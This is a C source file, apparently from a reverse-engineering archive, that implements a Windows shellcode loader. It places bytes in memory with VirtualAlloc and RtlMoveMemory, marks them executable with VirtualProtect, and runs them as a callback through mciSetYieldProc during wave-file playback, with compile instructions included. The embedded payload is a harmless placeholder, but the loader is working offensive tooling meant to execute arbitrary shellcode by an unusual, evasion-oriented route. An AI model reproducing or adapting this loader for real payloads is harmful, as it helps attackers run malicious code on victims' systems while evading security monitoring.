/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  mciSetYieldProc
*/

#include <windows.h>
#include <stdint.h>
#include <mmsystem.h>

#pragma comment(lib,"winmm")

int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    MCI_PLAY_PARMS  param_play;
    MCI_OPEN_PARMS  param_open;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // open normal wave file for play 
        ZeroMemory (&param_open, sizeof(param_open));
        param_open.lpstrDeviceType  = "waveaudio";
        param_open.lpstrElementName = "C:\\windows\\media\\tada.wav";
        mciSendCommand (NULL, MCI_OPEN, MCI_OPEN_ELEMENT, (DWORD_PTR)&param_open);

        // set callback which will be executed when waiting
        mciSetYieldProc (param_open.wDeviceID, (YIELDPROC)runtime, 0);

        // trigger execution
        ZeroMemory (&param_play, sizeof(param_play));
        mciSendCommand (param_open.wDeviceID, MCI_PLAY, MCI_WAIT, (DWORD_PTR) &param_play);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}